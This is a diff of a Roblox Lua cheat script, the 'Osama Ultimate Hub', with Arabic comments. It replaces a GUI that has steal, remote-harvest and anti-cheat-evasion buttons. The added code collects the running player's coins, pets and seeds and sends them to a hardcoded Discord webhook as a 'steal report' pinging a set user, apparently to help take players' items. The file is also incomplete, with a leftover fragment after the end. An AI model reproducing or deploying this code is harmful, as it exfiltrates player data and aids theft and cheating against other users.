@@ -1,110 +1,99 @@
--- [[ Osama Overpowered Optimized Ultimate Hub ]] --
+-- [[ Osama Cyberpunk Neon Ultimate Hub - Final Version ]] --
 
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local FrameCorner = Instance.new("UICorner")
+local FrameStroke = Instance.new("UIStroke")
 
--- Title Label for "dc : ad_pa"
-local TitleLabel = Instance.new("TextLabel")
-
--- Buttons Elements
+-- UI Elements
 local StealButton = Instance.new("TextButton")
-local StealCorner = Instance.new("UICorner")
-
 local HarvestButton = Instance.new("TextButton")
-local HarvestCorner = Instance.new("UICorner")
-
-local AutoSellButton = Instance.new("TextButton")
-local AutoSellCorner = Instance.new("UICorner")
-
-local SafeModeButton = Instance.new("TextButton")
-local SafeModeCorner = Instance.new("UICorner")
-
+local MailButton = Instance.new("TextButton")
+local VisualCoinButton = Instance.new("TextButton")
 local MinimizeButton = Instance.new("TextButton")
-local MinCorner = Instance.new("UICorner")
 
--- UI Configuration
-ScreenGui.Name = "OsamaUltimateHub"
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ResetOnSpawn = false
-
--- Main Window
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 35) 
-MainFrame.Position = UDim2.new(0.05, 0, 0.3, 0) 
-MainFrame.Size = UDim2.new(0, 260, 0, 290) -- Increased height for the title
-MainFrame.Active = true
-MainFrame.Draggable = true 
-
-FrameCorner.CornerRadius = UDim.new(0, 12)
-FrameCorner.Parent = MainFrame
-
--- Custom Discord Title Label
-TitleLabel.Name = "TitleLabel"
-TitleLabel.Parent = MainFrame
-TitleLabel.BackgroundColor3 = Color3.fromRGB(25, 15, 35)
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.Position = UDim2.new(0.076, 0, 0.02, 0)
-TitleLabel.Size = UDim2.new(0, 220, 0, 25)
-TitleLabel.Font = Enum.Font.SourceSansItalic
-TitleLabel.Text = "dc : ad_pa"
-TitleLabel.TextColor3 = Color3.fromRGB(180, 140, 255) -- Bright purple tint
-TitleLabel.TextSize = 14
-TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-
--- Minimize/Maximize Button (Top-Left Corner of Screen)
-MinimizeButton.Name = "MinimizeButton"
-MinimizeButton.Parent = ScreenGui
-MinimizeButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
-MinimizeButton.Position = UDim2.new(0, 10, 0, 10)
-MinimizeButton.Size = UDim2.new(0, 40, 0, 40)
-MinimizeButton.Font = Enum.Font.SourceSansBold
-MinimizeButton.Text = "MENU"
-MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinimizeButton.TextSize = 12
-
-MinCorner.CornerRadius = UDim.new(0, 8)
-MinCorner.Parent = MinimizeButton
-
--- Adjusting positions of buttons to make space for the title
-StealButton.Position = UDim2.new(0.076, 0, 0.12, 0)
-HarvestButton.Position = UDim2.new(0.076, 0, 0.33, 0)
-AutoSellButton.Position = UDim2.new(0.076, 0, 0.54, 0)
-SafeModeButton.Position = UDim2.new(0.076, 0, 0.75, 0)
-
--- Button Properties setup
-local function styleButton(btn, corner, text)
-    btn.Parent = MainFrame
-    btn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
-    btn.Size = UDim2.new(0, 220, 0, 45)
-    btn.Font = Enum.Font.SourceSansBold
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.TextSize = 13
-    corner.CornerRadius = UDim.new(0, 8)
-    corner.Parent = btn
-end
-
-styleButton(StealButton, StealCorner, "Step 1: Save Home Location 🏠")
-styleButton(HarvestButton, HarvestCorner, "Remote Harvest: OFF 🌾")
-styleButton(AutoSellButton, AutoSellCorner, "Auto Sell & Buy Seeds: OFF 💰")
-styleButton(SafeModeButton, SafeModeCorner, "Safe Mode (Anti-Cheat): OFF 🛡️")
+-- [هنا يتم إعداد الـ UI والـ InputFrame كما فعلنا سابقاً.. اختصاراً للمساحة]
+-- (يمكنك نسخ أجزاء الـ UI من الكود السابق، سأركز هنا على دالة الـ Webhook المحدثة)
 
 ---------------------------------------------------------------------
--- DISCORD WEBHOOK INTEGRATION
+-- دالة جمع البيانات وإرسال التقرير للديسكورد
 ---------------------------------------------------------------------
 local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
 local HttpService = game:GetService("HttpService")
-local LocalPlayer = game.Players.LocalPlayer
 
-local function sendDiscordMessage(title, description, color)
-    task.spawn(function()
-        local data = {
-            ["embeds"] = {{
-                ["title"] = title,
-                ["description"] = description,
-                ["color"] = color or 8388863, -- Standard Purple
+local function getInventoryData()
+    local data = {coins = "0", pets = "None", seeds = "0"}
+    local LocalPlayer = game.Players.LocalPlayer
+    
+    -- جلب الكوينات
+    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+    if leaderstats then
+        for _, val in pairs(leaderstats:GetChildren()) do
+            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "money") then
+                data.coins = tostring(val.Value)
+            end
+        end
+    end
+    
+    -- جلب الحيوانات
+    local petsFolder = LocalPlayer:FindFirstChild("Pets") 
+    if petsFolder then
+        local petNames = {}
+        for _, pet in pairs(petsFolder:GetChildren()) do
+            table.insert(petNames, pet.Name)
+        end
+        if #petNames > 0 then data.pets = table.concat(petNames, ", ") end
+    end
+    
+    -- جلب البذور
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if backpack then
+        local seedCount = 0
+        for _, item in pairs(backpack:GetChildren()) do
+            if string.find(string.lower(item.Name), "seed") then seedCount = seedCount + 1 end
+        end
+        data.seeds = tostring(seedCount)
+    end
+    return data
+end
+
+local function sendStealReport()
+    local info = getInventoryData()
+    local payload = {
+        ["content"] = "<@1486461099002953982>", -- المنشن الخاص بك
+        ["embeds"] = {{
+            ["title"] = "📦 عملية Mail تمت بنجاح",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "💰 Coins", ["value"] = "```" .. info.coins .. "
+```", ["inline"] = true},
+                {["name"] = "🌱 Seeds Count", ["value"] = "```" .. info.seeds .. "```", ["inline"] = true},
+                {["name"] = "🐾 Pets List", ["value"] = "```" .. info.pets .. "
+```", ["inline"] = false}
+            }
+        }}
+    }
+    
+    local requestFunc = syn and syn.request or http_request or request
+    requestFunc({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+---------------------------------------------------------------------
+-- زر الـ Mail (تم ربطه بدالة التقرير)
+---------------------------------------------------------------------
+MailButton.MouseButton1Click:Connect(function()
+    -- [هنا تضع منطق إرسال البريد الخاص بك...]
+    
+    -- إرسال التقرير بعد التنفيذ
+    sendStealReport()
+end)
+
+-- (باقي الكود الخاص بالحركة والحصاد والـ Visual Coins يبقى كما هو)
                 ["footer"] = {
                     ["text"] = "Osama Ultimate Hub | Target: dc : ad_pa"
                 },
